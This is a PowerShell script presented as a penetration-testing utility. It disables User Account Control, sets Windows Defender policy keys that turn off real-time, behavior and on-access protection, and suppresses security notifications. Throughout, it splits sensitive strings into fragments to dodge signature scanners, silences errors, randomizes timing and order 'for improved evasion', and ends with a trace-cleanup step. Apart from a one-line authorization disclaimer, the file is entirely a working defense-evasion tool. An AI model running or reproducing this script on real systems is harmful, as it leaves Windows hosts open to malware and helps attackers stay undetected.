# Security Controls Management Utility
# For authorized penetration testing in controlled environments only

# Minimize trace generation
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'

# Fragment sensitive terms
$s = "Sy" + "st" + "em"
$d = "De" + "fe" + "nd" + "er"
$mp = "M" + "pPr" + "eference"
$ps = "Po" + "wer" + "Sh" + "ell"
$reg = "Re" + "gis" + "try"
$win = "Wi" + "nd" + "ows"
$msoft = "Mi" + "cro" + "soft"

# Dynamic string composition
function Join-TextSegments {
    param([string[]]$segments)
    return -join $segments
}

# Operation wrapper with jitter
function Invoke-Operation {
    param([scriptblock]$task)
    try { & $task } catch {}
    Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 250)
}

# 1. DISABLE UAC SETTINGS
function Disable-UACSettings {
    $baseKey = Join-TextSegments @("HKLM:\Soft", "ware\", "$msoft", "\", "$win", "\Cur", "rentVer", "sion\Pol", "icies\", "$s")
    
    $settings = @(
        @{n=("Ena"+"bleLUA"); v=0},
        @{n=("Con"+"sentPromptBe"+"haviorAd"+"min"); v=0},
        @{n=("Con"+"sentPromptBe"+"haviorUs"+"er"); v=0},
        @{n=("Pro"+"mptOnSe"+"cureDes"+"ktop"); v=0},
        @{n=("Lo"+"calAcco"+"untTok"+"enFil"+"terPo"+"licy"); v=1},
        @{n=("Fil"+"terAdm"+"inist"+"ratorTo"+"ken"); v=0}
    )
    
    foreach($setting in $settings) {
        Invoke-Operation {
            $null = Set-ItemProperty -Path $baseKey -Name $setting.n -Value $setting.v -Type DWord -Force
        }
    }
}

# 2. CONFIGURE DEFENDER REGISTRY GPOs
function Set-DefenderGPOs {
    # Create policy paths if they don't exist
    $policyPaths = @(
        (Join-TextSegments @("HKLM:\SOFT", "WARE\Pol", "icies\", "$msoft", "\", "$win", " ", "$d")),
        (Join-TextSegments @("HKLM:\SOFT", "WARE\Pol", "icies\", "$msoft", "\", "$win", " ", "$d", "\Real-Time Pro", "tection"))
    )
    
    foreach($path in $policyPaths) {
        Invoke-Operation {
            if (!(Test-Path $path)) {
                $null = New-Item -Path $path -Force
            }
        }
    }
    
    # Configure policy settings
    $policies = @(
        @{p=$policyPaths[0]; n="Disa"+"bleAnti"+"Spy"+"ware"; v=1},
        @{p=$policyPaths[1]; n="Disa"+"bleReal"+"timeMon"+"itoring"; v=1},
        @{p=$policyPaths[1]; n="Disa"+"bleBeh"+"aviorMon"+"itoring"; v=1},
        @{p=$policyPaths[1]; n="Disa"+"bleSca"+"nOnReal"+"timeEn"+"able"; v=1},
        @{p=$policyPaths[1]; n="Disa"+"bleOn"+"Access"+"Prot"+"ection"; v=1},
        @{p=$policyPaths[1]; n="Disa"+"bleIO"+"AVProt"+"ection"; v=1}
    )
    
    foreach($policy in $policies) {
        Invoke-Operation {
            $null = Set-ItemProperty -Path $policy.p -Name $policy.n -Value $policy.v -Type DWord -Force
        }
    }
}

# 3. DISABLE SECURITY NOTIFICATIONS
function Disable-SecurityNotifications {
    $notificationPaths = @(
        (Join-TextSegments @("HKLM:\SOFT", "WARE\Pol", "icies\", "$msoft", "\", "$win", " ", "$d", " Security Center\Noti", "fications")),
        (Join-TextSegments @("HKLM:\SOFT", "WARE\", "$msoft", "\", "$win", "\Cur", "rentVer", "sion\Noti", "fications\Settings\", "$win", ".SystemToast.SecurityAndMaintenance"))
    )
    
    foreach($i in 0..1) {
        Invoke-Operation {
            $path = $notificationPaths[$i]
            $name = if($i -eq 0) { "Disa"+"bleNoti"+"fications" } else { "Ena"+"bled" }
            $value = if($i -eq 0) { 1 } else { 0 }
            
            if (!(Test-Path $path)) {
                $null = New-Item -Path $path -Force
            }
            $null = Set-ItemProperty -Path $path -Name $name -Value $value -Force
        }
    }
}

# MAIN EXECUTION BLOCK
# Execute security modifications
$modules = @(
    (Get-Item "function:Disable-UACSettings"),
    (Get-Item "function:Set-DefenderGPOs"),
    (Get-Item "function:Disable-SecurityNotifications")
)

# Randomize execution order for improved evasion
$order = @(0, 1, 2)
if ((Get-Random -Minimum 1 -Maximum 10) -gt 7) {
    $order = @(1, 0, 2)
}

foreach($i in $order) {
    & $modules[$i].ScriptBlock
    Start-Sleep -Milliseconds (Get-Random -Minimum 300 -Maximum 800)
}

# Cleanup traces
$null = [System.GC]::Collect()